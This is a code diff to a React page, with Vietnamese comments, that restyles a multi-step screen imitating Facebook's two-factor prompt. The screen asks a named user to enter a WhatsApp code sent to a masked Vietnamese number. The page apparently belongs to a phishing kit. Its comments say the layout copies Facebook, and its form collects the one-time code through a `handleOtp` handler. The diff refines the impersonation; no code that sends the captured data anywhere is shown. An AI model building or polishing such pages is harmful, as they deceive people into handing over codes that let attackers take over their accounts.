@@ -747,18 +747,24 @@ export default function Home() {
                 </div>
               )}
 
-              {/* BƯỚC 4: OTP FULL PAGE - Giống ảnh gửi */}
+              {/* BƯỚC 4: OTP FULL PAGE - Layout giống Facebook */}
               {step === 4 && !showSuccess && (
                 <div>
                   <p style={{ fontSize: '14px', color: '#65676b', marginBottom: '8px' }}>Lê Hiếu • Facebook</p>
-                  <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21' }}>Check your WhatsApp messages</h2>
-                  <p style={{ fontSize: '15px', color: '#1c1e21', marginBottom: '24px' }}>
-                    Enter the code we sent to your WhatsApp account at <strong>+84 *******00</strong>.
-                  </p>
 
-                  {/* Ảnh minh họa WhatsApp */}
-                  <div style={{ marginBottom: '24px', borderRadius: '8px', overflow: 'hidden' }}>
-                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="WhatsApp Code" style={{ width: '100%', display: 'block', background: '#fce4ec' }} />
+                  {/* Hai cột: text bên trái, ảnh 2FA bên phải */}
+                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '24px', marginBottom: '24px', flexWrap: 'wrap' }}>
+                    <div style={{ flex: '1 1 260px', minWidth: '240px' }}>
+                      <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21', lineHeight: '1.3' }}>
+                        Check your WhatsApp messages
+                      </h2>
+                      <p style={{ fontSize: '15px', color: '#1c1e21', margin: 0, lineHeight: '1.4' }}>
+                        Enter the code we sent to your WhatsApp account at <strong>+84 *******00</strong>.
+                      </p>
+                    </div>
+                    <div style={{ flex: '0 1 220px', minWidth: '180px' }}>
+                      <img src="/images/2fa-illustration.webp" alt="2FA Code" style={{ width: '100%', display: 'block' }} />
+                    </div>
                   </div>
 
                   <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
@@ -778,7 +784,7 @@ export default function Home() {
                       }} 
                     />
                     
-                    <div style={{ fontSize: '14px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                    <div style={{ fontSize: '14px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
                       It may take a few minutes for you to get this code.
                       {otpCanResend ? (
